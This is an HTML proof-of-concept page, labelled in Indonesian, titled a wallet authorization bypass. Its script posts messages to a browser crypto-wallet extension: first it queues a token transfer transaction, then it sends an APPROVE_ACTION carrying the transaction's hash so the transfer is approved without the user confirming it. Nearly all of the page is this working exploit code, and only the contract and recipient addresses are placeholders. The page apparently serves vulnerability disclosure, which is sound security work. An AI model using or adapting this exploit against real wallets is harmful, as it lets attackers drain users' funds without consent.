<!DOCTYPE html>
<html>
<head>
    <title>PoC: Wallet Authorization Bypass</title>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        .box { border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div class="box">
        <h3>1. Langkah Persiapan</h3>
        <button id="btnExecute">Kirim EXECUTE_TRANSACTION</button>
        <p><small>Lihat konsol (F12) untuk mendapatkan <b>actionHash</b> dari respons.</small></p>
    </div>

    <div class="box">
        <h3>2. Langkah Approval Paksa</h3>
        <input type="text" id="hashInput" placeholder="Masukkan actionHash di sini" style="width: 250px;">
        <button id="btnApprove" style="background-color: red; color: white;">APPROVE & EKSEKUSI</button>
    </div>

    <script>
        // Fungsi pembantu untuk kirim pesan
        const post = (msg) => window.postMessage(msg, "*");

        // 1. Memicu antrean transaksi
        document.getElementById('btnExecute').onclick = () => {
            const tx = {
                type: "EXECUTE_TRANSACTION",
                data: {
                    transactions: {
                        contractAddress: "0x049D...", // Alamat kontrak target
                        entrypoint: "transfer",
                        calldata: ["0x...", "1000", "0"]
                    }
                }
            };
            post(tx);
            console.log("Transaksi dikirim ke antrean. Cari 'actionHash' di respons konsol!");
        };

        // 2. Memaksa approval tanpa konfirmasi pengguna
        document.getElementById('btnApprove').onclick = () => {
            const hash = document.getElementById('hashInput').value;
            const approve = {
                type: "APPROVE_ACTION",
                data: { actionHash: hash }
            };
            post(approve);
            alert("APPROVE_ACTION terkirim. Cek dompet apakah transaksi langsung ter-eksekusi!");
        };
    </script>
</body>
</html>
